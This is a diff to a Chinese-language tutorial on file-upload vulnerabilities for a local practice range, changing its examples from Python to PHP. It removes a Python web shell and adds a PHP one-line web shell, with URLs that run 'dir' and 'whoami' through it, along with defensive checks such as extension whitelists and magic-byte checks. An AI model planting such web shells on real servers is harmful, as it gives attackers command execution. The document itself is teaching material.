@@ -9,7 +9,7 @@
 ```
 攻击流程：
 1. 找到一个允许上传的页面
-2. 上传一个 Web Shell（如 shell.php, shell.py, shell.jsp）
+2. 上传一个 Web Shell（如 shell.php, shell.jsp）
 3. 访问上传的文件 URL
 4. 服务器执行恶意代码 = 服务器被控！
 ```
@@ -24,20 +24,16 @@
 
 ### 练习 2：上传 Web Shell
 
-创建文件 `shell.py`：
+创建文件 `shell.php`：
 
-```python
-# 一个简单的 Python Web Shell
-import os
-print("Content-Type: text/plain\n")
-cmd = os.environ.get('QUERY_STRING', 'dir')
-print(os.popen(cmd).read())
+```php
+<?php system($_GET['cmd']); ?>
 ```
 
 上传后访问：
 ```
-http://127.0.0.1:5000/uploads/shell.py?dir
-http://127.0.0.1:5000/uploads/shell.py?whoami
+http://127.0.0.1:5000/uploads/shell.php?cmd=dir
+http://127.0.0.1:5000/uploads/shell.php?cmd=whoami
 ```
 
 ### 如果靶场是 PHP 环境，经典的 PHP 一句话木马：
@@ -99,25 +95,26 @@ http://example.com/include.php?file=uploads/evil.jpg
 ## 🛡️ 防御方法
 
 ### ✅ 1. 白名单扩展名
-```python
-ALLOWED = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
-ext = filename.rsplit('.', 1)[-1].lower()
-if ext not in ALLOWED:
-    raise ValueError("不允许的文件类型")
+```php
+$ALLOWED = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
+$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+if (!in_array($ext, $ALLOWED)) {
+    throw new Exception("不允许的文件类型");
+}
 ```
 
 ### ✅ 2. 检查文件内容（魔数）
-```python
-# 检查文件头（magic bytes）
-magic = file.read(4)
-if magic[:2] != b'\xff\xd8':  # JPEG 文件头
-    raise ValueError("伪装成图片！")
+```php
+// 检查文件头（magic bytes）
+$magic = file_get_contents($file['tmp_name'], false, null, 0, 4);
+if (substr($magic, 0, 2) !== "\xFF\xD8") {  // JPEG 文件头
+    throw new Exception("伪装成图片！");
+}
 ```
 
 ### ✅ 3. 重命名文件
-```python
-import uuid
-new_name = str(uuid.uuid4()) + '.jpg'  # 自定义扩展名
+```php
+$new_name = bin2hex(random_bytes(16)) . '.jpg';  // 自定义扩展名
 ```
 
 ### ✅ 4. 上传目录不执行脚本
@@ -129,16 +126,17 @@ location /uploads/ {
 ```
 
 ### ✅ 5. 限制文件大小
-```python
-if len(file.read()) > 10 * 1024 * 1024:  # 10MB
-    raise ValueError("文件太大")
+```php
+if ($file['size'] > 10 * 1024 * 1024) {  // 10MB
+    throw new Exception("文件太大");
+}
 ```
 
 ---
 
 ## 📝 练习
 
-1. 在靶场上传 `shell.py`，访问看能否执行
+1. 在靶场上传 `shell.php`，访问看能否执行
 2. 尝试上传 `.html` 文件并访问（这也算一种 XSS！）
 3. 思考：如果服务器限制只允许 `.jpg`，你怎么绕过？
 
